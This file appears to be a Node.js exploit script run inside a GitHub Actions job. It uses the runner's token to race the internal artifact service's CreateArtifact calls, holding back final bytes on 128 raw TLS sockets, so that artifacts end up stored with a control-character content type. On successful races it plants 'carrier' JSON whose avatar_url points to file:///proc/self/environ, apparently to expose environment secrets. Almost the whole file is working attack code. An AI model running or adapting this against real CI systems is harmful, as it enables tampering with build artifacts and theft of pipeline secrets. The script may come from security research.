import {createHash} from 'node:crypto';
import tls from 'node:tls';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"barrier"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const resultsUrl = new URL(process.env.ACTIONS_RESULTS_URL);
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const endpoint = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  resultsUrl,
);
const winners = [];
const COUNT = 64;

function decodeChunked(bytes) {
  const output = [];
  let offset = 0;
  while (offset < bytes.length) {
    const lineEnd = bytes.indexOf('\r\n', offset, 'latin1');
    if (lineEnd < 0) break;
    const size = Number.parseInt(bytes.subarray(offset, lineEnd).toString('ascii').split(';', 1)[0], 16);
    if (!Number.isFinite(size) || size === 0) break;
    const start = lineEnd + 2;
    output.push(bytes.subarray(start, start + size));
    offset = start + size + 2;
  }
  return Buffer.concat(output);
}

function parseResponse(bytes) {
  const split = bytes.indexOf('\r\n\r\n', 0, 'latin1');
  if (split < 0) return {ok: false, error: 'missing HTTP response headers'};
  const head = bytes.subarray(0, split).toString('latin1');
  const status = Number(head.split('\r\n', 1)[0].split(' ')[1]);
  const chunked = /\r\ntransfer-encoding:\s*chunked\r\n/i.test(`\r\n${head}\r\n`);
  let body = bytes.subarray(split + 4);
  if (chunked) body = decodeChunked(body);
  let document;
  try {
    document = JSON.parse(body.toString('utf8'));
  } catch {
    return {ok: false, status, error: 'invalid JSON response'};
  }
  const url = document.signedUploadUrl || document.signed_upload_url;
  if (status < 200 || status >= 300 || typeof url !== 'string') {
    return {ok: false, status, error: String(document.msg || 'CreateArtifact failed').slice(0, 160)};
  }
  return {ok: true, status, url};
}

function stagedCreate(name, version) {
  const mimeType = version === 6 ? odd : 'application/json';
  const body = Buffer.from(JSON.stringify({
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
    name,
    version,
    mime_type: mimeType,
  }));
  const header = Buffer.from(
    `POST ${endpoint.pathname}${endpoint.search} HTTP/1.1\r\n` +
    `Host: ${endpoint.host}\r\n` +
    `Authorization: Bearer ${token}\r\n` +
    'Content-Type: application/json\r\n' +
    'Accept: application/json\r\n' +
    'User-Agent: repo-cassette-barrier\r\n' +
    `Content-Length: ${body.length}\r\n` +
    'Connection: close\r\n\r\n',
    'utf8',
  );
  let release;
  const released = new Promise(resolve => { release = resolve; });
  let readyResolve;
  let readyReject;
  const ready = new Promise((resolve, reject) => {
    readyResolve = resolve;
    readyReject = reject;
  });
  const done = new Promise(resolve => {
    const chunks = [];
    const socket = tls.connect({
      host: endpoint.hostname,
      port: Number(endpoint.port || 443),
      servername: endpoint.hostname,
      ALPNProtocols: ['http/1.1'],
    });
    socket.setTimeout(20000);
    socket.once('secureConnect', () => {
      socket.write(Buffer.concat([header, body.subarray(0, -1)]), error => {
        if (error) readyReject(error);
        else readyResolve();
      });
    });
    socket.on('data', chunk => chunks.push(chunk));
    socket.once('error', error => {
      readyReject(error);
      resolve({ok: false, error: String(error).slice(0, 160), version});
    });
    socket.once('timeout', () => socket.destroy(new Error('socket timeout')));
    socket.once('end', () => resolve({...parseResponse(Buffer.concat(chunks)), version}));
    released.then(() => socket.write(body.subarray(-1)));
  });
  return {ready, release, done};
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, contentType: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette barrier carrier',
    stargazers_count: 0,
  }));
}

const groups = Array.from({length: COUNT}, (_, index) => ({
  index,
  name: `barrier-${process.env.GITHUB_RUN_ID}-${index}`,
}));
const staged = [];
for (const group of groups) {
  staged.push({...stagedCreate(group.name, 6), group, version: 6});
  staged.push({...stagedCreate(group.name, 7), group, version: 7});
}
await Promise.all(staged.map(item => item.ready));
for (const item of staged) item.release();
const outcomes = await Promise.all(staged.map(item => item.done));
for (let index = 0; index < staged.length; index++) {
  const group = staged[index].group;
  if (!group.creates) group.creates = [];
  group.creates.push(outcomes[index]);
}

await Promise.all(groups.map(group => Promise.all(
  group.creates.map(item => upload(item.url, placeholder).catch(() => false)),
)));

const rows = await Promise.all(groups.map(async group => {
  const final = await finalize(group.name);
  const view = await inspect(group.name);
  const isOdd = view.contentType?.includes('\u0085') ?? false;
  const row = {
    index: group.index,
    created6: group.creates.some(x => x.ok && x.version === 6),
    created7: group.creates.some(x => x.ok && x.version === 7),
    statuses: group.creates.map(x => x.status ?? null),
    final,
    view: view.ok ? {
      ok: true,
      contentType: JSON.stringify(view.contentType).slice(1, -1),
    } : view,
    isOdd,
  };
  if (isOdd && final.id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    const placed = await Promise.all(
      group.creates.map(item => upload(item.url, carrierBytes(repository)).catch(() => false)),
    );
    row.repository = repository;
    row.carrierPlaced = placed.some(Boolean);
    if (row.carrierPlaced) winners.push({id: final.id, name: group.name, repository});
  }
  console.log(`BARRIER ${JSON.stringify(row)}`);
  return row;
}));

const summary = {
  total: rows.length,
  odd: rows.filter(row => row.isOdd).length,
  finalized: rows.filter(row => row.final?.ok).length,
  bothCreated: rows.filter(row => row.created6 && row.created7).length,
};
console.log(`BARRIER_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners, summary, rows,
}, null, 2) + '\n');
